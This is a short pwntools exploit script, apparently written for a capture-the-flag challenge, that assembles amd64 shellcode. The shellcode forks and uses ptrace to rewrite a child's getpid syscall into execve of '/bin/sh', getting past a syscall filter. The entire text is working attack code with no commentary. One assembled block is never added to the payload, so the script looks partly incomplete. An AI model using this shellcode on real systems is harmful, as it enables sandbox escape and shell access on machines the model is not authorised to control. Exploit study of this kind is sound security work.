from pwn import * 
import pwnlib.shellcraft as sc
context(arch='amd64',os = 'linux', log_level='DEBUG')
SYS_getpid = 186
SYS_fork = 57
SYS_ptrace = 101
SYS_waitpid = 61
SYS_open = 2
SYS_write = 1
SYS_read = 0


payload = b''
payload+=asm(
sc.syscall('SYS_fork'))
payload+=asm("cmp rax,0")+b'u\x09'+asm("lea rsi,[rip]\nadd rsi,74\nmov r15,rsi\njmp rsi")
asm(sc.mov('rdi','rax')+\
sc.mov('r14','rax')+\
sc.mov('rax',SYS_waitpid)+\
sc.setregs({'rsi':0,'rdx':0})+\
'syscall\n'+\
sc.setregs({'rax':SYS_ptrace, 'rsi':'r14', 'rdi':0x18,'rcx':0,'rdx':0})+\
'syscall\n'+\
sc.setregs({'rax':SYS_waitpid, 'rdi':'r14','rsi':0,'rdx':0}) +\
'syscall\n'+\
sc.setregs({'rax':SYS_ptrace, 'rsi':'r14', 'rdi':0xc, 'rcx':'r15','rdx':0})+\
'syscall\n'+\
'mov rdi,r15\n' +\
'add rdi,0x98\n'+\
'mov dword ptr [rdi],59\n' +\
sc.setregs({'rax':SYS_ptrace, 'rsi':'r14','rdi':0xd, 'rcx':'r15', 'rdx':0})+\
'syscall\n'+\
sc.setregs({'rax':SYS_ptrace, 'rsi': 'r14', 'rdi':0x11, 'rcx':0, 'rdx':0})+\
'syscall\n')
# sc.read(0,'rsp',0x100)
shell=asm(sc.amd64.setregs({'rax':SYS_ptrace,'rdi':0,'rsi':0,'rdx':0})+\
'''
syscall
mov rax,186
syscall
mov rdi,rax
mov rsi,19
mov rax,200
syscall
'''
)
shell+=asm(sc.pushstr('/bin/sh\x00')+sc.syscall('SYS_getpid','rsp',0,0))

info(len(shell))